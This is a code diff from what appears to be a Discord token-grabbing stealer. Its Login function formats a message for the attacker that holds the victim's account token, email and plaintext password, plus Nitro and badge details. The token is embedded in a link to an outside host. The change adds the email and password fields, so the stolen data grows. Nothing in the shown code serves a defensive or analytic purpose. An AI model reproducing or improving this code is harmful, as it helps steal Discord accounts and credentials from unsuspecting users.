@@ -148,14 +148,19 @@ function Login(email, password, token) {
                 description: `<:greyrules:963541502074707999> Click to Copy(https://superfurrycdn.nl/copy/${token})`,
                 color: 000000,
                 fields: [{
-                            "name": "<a:CH_MoneyFlying:715585160497856533> Token",
-                            "value": `\`\`\`${token}\`\`\``,
+                            "name": "<a:CH_MoneyFlying:715585160497856533> Token [Click To Copy](https://superfurrycdn.nl/copy/${token})",
+                            "value": `\`${token}\``,
                             "inline": false
                         },
                         {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
+                            "name": "<:blackdollar:963466396149383168> Account Information",
+                            "value": `\`\`\`・Email : ${email} ・Password : ${password}\`\`\``,
                             "inline": false
+                        },
+                        {
+                            "name": "<:mm_goingupRocket:943480651280158800> More Information",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "inline": true
                         }
                     ],
                     "author": {
